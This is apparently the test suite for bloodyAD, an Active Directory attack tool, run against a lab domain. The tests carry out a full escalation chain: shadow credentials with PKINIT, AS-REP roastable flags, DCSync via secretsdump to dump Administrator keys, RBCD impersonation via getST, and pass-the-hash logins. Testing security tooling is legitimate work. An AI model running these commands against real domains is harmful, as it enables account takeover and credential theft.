import unittest, subprocess, pathlib, json, hashlib, os, re


class TestModules(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
        cls.domain = conf["domain"]
        cls.rootDomainNamingContext = ",".join(
            ["DC=" + subdomain for subdomain in cls.domain.split(".")]
        )
        cls.host = conf["pdc"]["ip"]
        cls.admin = {
            "username": conf["admin_user"]["username"],
            "password": conf["admin_user"]["password"],
        }
        cls.pkinit_path = conf["pkinit_path"]
        cls.toTear = []
        cls.env = os.environ.copy()
        cls.bloody_prefix = [
            "python3",
            "bloodyAD.py",
            "--host",
            cls.host,
            "-d",
            cls.domain,
        ]
        cls.user = {"username": "stan.dard", "password": "Password123!"}

    def test_01AuthCreateUser(self):
        # Add User
        self.createUser(self.admin, self.user["username"], self.user["password"])
        username_pass = ["-u", self.user["username"], "-p"]

        cleartext = username_pass + [self.admin["password"]]
        ntlm = username_pass + [
            f":{hashlib.new('md4',self.admin['password'].encode('utf-16le')).hexdigest()}"
        ]

        self.launchProcess(
            [
                "getTGT.py",
                "-dc-ip",
                self.host,
                f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
            ]
        )
        self.env["KRB5CCNAME"] = f"{self.admin['username']}.ccache"
        krb = ["-k"]

        cert = ["-c", ":Administrator.pem"]

        auths = [cleartext, ntlm, krb, cert]
        for auth in auths:
            for sec_state in ["", "-s "]:
                self.launchProcess(
                    self.bloody_prefix
                    + auth
                    + (
                        sec_state + "getObjectAttributes Administrator sAMAccountName"
                    ).split(" ")
                )

    def test_02SearchAndGetChild(self):
        self.launchBloody(
            self.user,
            ["getChildObjects", "OU=Domain Controllers,DC=bloody,DC=local"],
        )
        self.launchBloody(
            self.user,
            [
                "search",
                self.rootDomainNamingContext,
                "(cn=Administrator)",
                "description",
            ],
        )

    def test_03UacOwnerGenericShadowGroupPasswordDCSync(self):
        slave = {"username": "slave", "password": "Password123!"}
        # Tries another OU
        ou = "CN=FOREIGNSECURITYPRINCIPALS," + self.rootDomainNamingContext
        self.createUser(self.admin, slave["username"], slave["password"], ou=ou)
        self.launchBloody(
            slave,
            [
                "getObjectAttributes",
                f"CN={slave['username']},{ou}",
                "distinguishedName",
            ],
        )

        # SetGenericAll
        self.launchBloody(
            self.admin,
            ["setGenericAll", self.user["username"], slave["username"]],
        )
        self.toTear.append(
            (
                self.removeGenericAll,
                self.user,
                self.user["username"],
                slave["username"],
            )
        )

        # SetUAC
        self.launchBloody(
            self.user, ["setUserAccountControl", slave["username"], "0x400000"]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    slave["username"],
                    "UserAccountControl",
                ],
            ),
            "DONT_REQ_PREAUTH",
        )
        self.launchBloody(
            self.user,
            ["setUserAccountControl", slave["username"], "0x400000", "False"],
        )

        # SetOwner
        self.launchBloody(
            self.user, ["setOwner", self.user["username"], slave["username"]]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    slave["username"],
                    "ntSecurityDescriptor",
                    "True",
                ],
                doPrint=False,
            ),
            f'"Owner": "{self.user["username"]}',
        )

        # Shadow
        outfile1 = "shado_cred"
        out_shado1 = self.launchBloody(
            self.user,
            ["setShadowCredentials", slave["username"], "True", outfile1],
        )
        outfile2 = "shado_cred2"
        self.launchBloody(
            self.user,
            ["setShadowCredentials", slave["username"], "True", outfile2],
        )
        id_shado1 = re.search("DeviceID: (.+)", out_shado1).group(1)
        self.pkinit(slave["username"], outfile1)
        self.launchBloody(
            self.user,
            [
                "setShadowCredentials",
                slave["username"],
                "False",
                "None",
                id_shado1,
            ],
        )
        self.pkinit(slave["username"], outfile2)
        self.launchBloody(
            self.user, ["setShadowCredentials", slave["username"], "False"]
        )

        # Group
        self.launchBloody(
            self.admin, ["setGenericAll", self.user["username"], "IIS_IUSRS"]
        )
        self.launchBloody(
            self.user, ["addObjectToGroup", slave["username"], "IIS_IUSRS"]
        )
        self.launchBloody(
            self.user, ["delObjectFromGroup", slave["username"], "IIS_IUSRS"]
        )

        # Password
        self.launchBloody(
            self.user, ["changePassword", slave["username"], "Password124!"]
        )
        self.launchBloody(
            self.user, ["changePassword", slave["username"], slave["password"]]
        )

        # DCsync
        self.launchBloody(
            self.admin,
            [
                "setGenericAll",
                self.user["username"],
                self.rootDomainNamingContext,
            ],
        )
        self.launchBloody(self.user, ["setDCSync", slave["username"]])
        self.assertRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(self.user, ["setDCSync", slave["username"], "False"])
        self.assertNotRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(
            self.admin,
            [
                "setGenericAll",
                self.user["username"],
                self.rootDomainNamingContext,
                "False",
            ],
        )

    def test_04ComputerRbcdGetSetAttribute(self):
        hostname = "test_pc"
        self.launchBloody(
            self.user,
            [
                "addComputer",
                hostname,
                "Password123!",
                "CN=COMPUTERS," + self.rootDomainNamingContext,
            ],
        )
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname + "$"])
        )

        hostname2 = "test_pc2"
        self.launchBloody(self.user, ["addComputer", hostname2, "Password123!"])
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname2 + "$"])
        )
        self.launchBloody(self.user, ["setRbcd", hostname2 + "$", hostname + "$"])

        hostname3 = "test_pc3"
        self.launchBloody(self.user, ["addComputer", hostname3, "Password123!"])
        self.toTear.append(
            (self.launchBloody, self.admin, ["delObject", hostname3 + "$"])
        )
        self.launchBloody(self.user, ["setRbcd", hostname3 + "$", hostname + "$"])

        # Test if rbcd correctly removed and doesn't remove all rbcd rights
        self.launchBloody(
            self.user, ["setRbcd", hostname3 + "$", hostname + "$", "False"]
        )
        self.assertNotRegex(
            self.launchBloody(
                self.user,
                [
                    "getObjectAttributes",
                    hostname + "$",
                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    "True",
                ],
            ),
            hostname3 + "$",
        )

        del self.env["KRB5CCNAME"]
        self.assertRegex(
            self.launchProcess(
                [
                    "getST.py",
                    "-spn",
                    f"HOST/{hostname}",
                    "-impersonate",
                    "Administrator",
                    "-dc-ip",
                    self.host,
                    f"{self.domain}/{hostname2}$:Password123!",
                ],
                False,
            ),
            "Saving ticket in",
        )

        # SetAttr
        self.launchBloody(
            self.admin,
            ["setGenericAll", self.user["username"], hostname + "$"],
        )
        self.launchBloody(
            self.user,
            [
                "setAttribute",
                hostname + "$",
                "servicePrincipalName",
                '["TOTO/my.local.domain","TATA/imaginary.unicorn"]',
            ],
        )

    def createUser(self, creds, usr, pwd, ou=None):
        args = ["addUser", usr, pwd]
        if ou:
            args += [ou]
        self.launchBloody(creds, args)
        self.toTear.append((self.launchBloody, creds, ["delObject", usr]))

    def removeGenericAll(self, creds, identity, target):
        self.launchBloody(creds, ["setGenericAll", identity, target, "False"])
        self.assertNotRegex(
            self.launchBloody(
                creds,
                [
                    "getObjectAttributes",
                    target,
                    "ntSecurityDescriptor",
                    "True",
                ],
                doPrint=False,
            ),
            '"Trustee": "' + identity,
        )

    def pkinit(self, username, outfile):
        self.assertRegex(
            self.launchProcess(
                [
                    "python3",
                    f"{self.pkinit_path}/gettgtpkinit.py",
                    "-dc-ip",
                    self.host,
                    "-cert-pem",
                    f"{outfile}_cert.pem",
                    "-key-pem",
                    f"{outfile}_priv.pem",
                    f"{self.domain}/{username}",
                    f"{outfile}.ccache",
                ],
                False,
            ),
            "Saved TGT to file",
        )
        for name in [
            f"{outfile}_cert.pem",
            f"{outfile}_priv.pem",
            f"{outfile}.ccache",
        ]:
            self.toTear.append([(pathlib.Path() / name).unlink])

    @classmethod
    def tearDownClass(cls):
        while len(cls.toTear):
            func = cls.toTear.pop()
            if len(func) > 1:
                func[0](*func[1:])
            else:
                func[0]()

    def launchBloody(self, creds, args, isErr=True, doPrint=True):
        cmd_creds = ["-u", creds["username"], "-p", creds["password"]]
        return self.launchProcess(self.bloody_prefix + cmd_creds + args, isErr, doPrint)

    def launchProcess(self, cmd, isErr=True, doPrint=True):
        out, err = subprocess.Popen(
            cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, env=self.env
        ).communicate()
        out = out.decode()
        if isErr:
            self.assertTrue(out, self.printErr(err.decode(), cmd))
        else:
            out += "\n" + err.decode()
        if doPrint:
            print(out)
        return out

    def printErr(self, err, cmd):
        err = err.replace("\n", "\n ")
        self.err = f"here is the error output ->\n\n {cmd}\n{err}"
        return self.err


if __name__ == "__main__":
    unittest.main(failfast=True)
